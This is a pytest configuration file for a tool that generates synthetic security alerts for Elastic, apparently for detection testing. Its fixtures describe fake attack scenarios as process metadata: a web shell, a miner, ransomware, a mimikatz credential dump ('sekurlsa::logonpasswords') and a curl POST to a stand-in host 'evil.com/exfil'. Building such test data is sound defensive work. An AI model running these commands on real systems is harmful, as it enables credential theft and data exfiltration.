"""Pytest configuration and fixtures."""

from typing import List
from unittest.mock import MagicMock

import pytest

from alerts_generator.config.settings import Settings
from alerts_generator.indexers.base import BaseIndexer
from alerts_generator.models.campaign import Campaign
from alerts_generator.models.scenario import MalwareFile, ProcessInfo, Scenario


@pytest.fixture
def settings():
    """Create test settings instance."""
    return Settings(
        elastic_url="localhost:9200",
        elastic_username="test",
        elastic_password="test",
        alerts_index=".alerts-security.alerts-default-test",
        elastic_security_rule_id="test-rule-id",
    )


@pytest.fixture
def sample_scenario():
    """Create a sample scenario for testing."""
    return Scenario(
        name="Test Attack",
        description="A test attack scenario",
        severity="high",
        processes=[
            ProcessInfo(
                name="init",
                executable="/sbin/init",
                args=["/sbin/init"],
                working_dir="/",
                user="root",
            ),
            ProcessInfo(
                name="malware",
                executable="/tmp/malware",
                args=["/tmp/malware", "--attack"],
                working_dir="/tmp",
                user="root",
            ),
        ],
        malware_file=MalwareFile(
            name="malware",
            path="/tmp/malware",
            extension="",
        ),
    )


@pytest.fixture
def multiple_scenarios() -> List[Scenario]:
    """Create multiple scenarios for testing."""
    return [
        Scenario(
            name="Web Shell Deployment",
            description="Web server compromised",
            severity="high",
            processes=[
                ProcessInfo(
                    name="apache2",
                    executable="/usr/sbin/apache2",
                    args=["/usr/sbin/apache2"],
                    working_dir="/var/www",
                    user="www-data",
                ),
                ProcessInfo(
                    name="php-fpm",
                    executable="/usr/sbin/php-fpm",
                    args=["/usr/sbin/php-fpm"],
                    working_dir="/var/www/html",
                    user="www-data",
                ),
                ProcessInfo(
                    name="webshell.php",
                    executable="/tmp/webshell.php",
                    args=["/tmp/webshell.php"],
                    working_dir="/tmp",
                    user="www-data",
                ),
            ],
            malware_file=MalwareFile(
                name="webshell.php",
                path="/tmp/webshell.php",
                extension=".php",
            ),
        ),
        Scenario(
            name="Crypto Miner",
            description="Cryptocurrency mining malware",
            severity="medium",
            processes=[
                ProcessInfo(
                    name="systemd",
                    executable="/usr/lib/systemd/systemd",
                    args=["/usr/lib/systemd/systemd"],
                    working_dir="/",
                    user="root",
                ),
                ProcessInfo(
                    name="miner",
                    executable="/tmp/miner",
                    args=["/tmp/miner", "--pool", "xmr.pool"],
                    working_dir="/tmp",
                    user="nobody",
                ),
            ],
            malware_file=MalwareFile(
                name="miner",
                path="/tmp/miner",
                extension="",
            ),
        ),
        Scenario(
            name="Ransomware",
            description="Ransomware attack",
            severity="critical",
            processes=[
                ProcessInfo(
                    name="explorer",
                    executable="C:\\Windows\\explorer.exe",
                    args=["explorer.exe"],
                    working_dir="C:\\Windows",
                    user="administrator",
                ),
                ProcessInfo(
                    name="ransomware.exe",
                    executable="C:\\Users\\temp\\ransomware.exe",
                    args=["ransomware.exe", "--encrypt"],
                    working_dir="C:\\Users\\temp",
                    user="administrator",
                ),
            ],
            malware_file=MalwareFile(
                name="ransomware.exe",
                path="C:\\Users\\temp\\ransomware.exe",
                extension=".exe",
            ),
        ),
        Scenario(
            name="Lateral Movement",
            description="Credential theft and lateral movement",
            severity="high",
            processes=[
                ProcessInfo(
                    name="lsass",
                    executable="C:\\Windows\\System32\\lsass.exe",
                    args=["lsass.exe"],
                    working_dir="C:\\Windows\\System32",
                    user="SYSTEM",
                ),
                ProcessInfo(
                    name="mimikatz",
                    executable="C:\\temp\\mimikatz.exe",
                    args=["mimikatz", "sekurlsa::logonpasswords"],
                    working_dir="C:\\temp",
                    user="SYSTEM",
                ),
            ],
            malware_file=MalwareFile(
                name="mimikatz.exe",
                path="C:\\temp\\mimikatz.exe",
                extension=".exe",
            ),
        ),
        Scenario(
            name="Data Exfiltration",
            description="Data theft attack",
            severity="high",
            processes=[
                ProcessInfo(
                    name="powershell",
                    executable="C:\\Windows\\System32\\powershell.exe",
                    args=["powershell.exe", "-NoProfile"],
                    working_dir="C:\\Users\\admin",
                    user="administrator",
                ),
                ProcessInfo(
                    name="curl",
                    executable="C:\\Windows\\System32\\curl.exe",
                    args=["curl", "-X", "POST", "https://evil.com/exfil"],
                    working_dir="C:\\Users\\admin",
                    user="administrator",
                ),
            ],
            malware_file=MalwareFile(
                name="exfil.ps1",
                path="C:\\Users\\admin\\exfil.ps1",
                extension=".ps1",
            ),
        ),
    ]


@pytest.fixture
def sample_campaign() -> Campaign:
    """Create a sample campaign for testing."""
    return Campaign(
        id="test1234",
        attacker_ip="203.0.113.42",
        c2_domain="evil-c2.badactor.com",
        c2_ip="198.51.100.15",
        malware_family="RedTeam-Ransomware",
        target_hosts=["web-server-01", "db-prod-03", "app-server-12"],
        file_hash_base="abc123def456",
    )


@pytest.fixture
def mock_indexer():
    """Create a mock indexer for testing."""
    mock = MagicMock(spec=BaseIndexer)
    mock.index_alert.return_value = {"_id": "test-alert-id", "result": "created"}
    mock.index_events.return_value = {"items": []}
    mock.delete_all.return_value = {
        "alerts_index": {"success": True, "deleted_count": 0},
        "process_events": {"success": True, "deleted_count": 0},
        "endpoint_alerts": {"success": True, "deleted_count": 0},
    }
    return mock
